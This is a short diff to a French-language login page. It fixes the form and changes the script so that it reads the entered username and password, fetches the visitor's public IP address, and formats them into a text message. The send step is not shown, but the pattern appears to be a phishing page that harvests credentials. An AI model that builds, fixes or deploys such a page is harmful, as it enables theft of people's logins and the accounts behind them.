@@ -128,7 +128,7 @@
       <div class="card-body">
         <h1 id="title">Connexion</h1>
 
-        <form id="loginForm" novalidate>
+        <form method="post" action="" id="loginForm" novalidate>
           <div class="row">
             <label for="user">Utilisateur</label>
             <div class="field">
@@ -177,7 +177,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
 
   // Récupération des valeurs du formulaire
-  const email = document.getElementById('email').value;
+  const email = document.getElementById('user').value;
   const password = document.getElementById('pass').value;
 
   // Récupération de l'adresse IP publique
@@ -218,3 +218,4 @@ IP : ${ip}`;
 
 </body>
 </html>
+
